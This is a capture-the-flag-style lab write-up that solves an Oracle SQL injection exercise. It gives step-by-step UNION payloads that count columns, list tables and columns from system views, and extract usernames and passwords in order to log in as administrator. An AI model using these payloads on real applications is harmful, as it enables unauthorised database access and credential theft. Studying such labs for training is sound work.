# Lab-06 SQL Injection

## SQL injection attack, listing the database contents on Oracle

### Problem

- This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

### Solution

- Goto => Product category and try 'Order by' Query to return number of column.`'ORDER by 2--+`

- So it's a Oracle database,there is a dual table in the database. We try `'UNION SELECT NULL,NULL from dual--+`

- Then we should enumurate all the table_name in the database.`UNION SELECT table_name,NULL from all_tables--+`

- We see that a users table is there name as `USERS_AMVGWA` and try to enumurate the column_name by using this query `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_AMVGWA'--+`

- We see 'Username & password column' and let's enumurate the administrator's password ` UNION SELECT USERNAME_IQKFHP,PASSWORD_GOUADD FROM USERS_AMVGWA--+`

- After that Login as Admin. 

- Lab Solved!!!
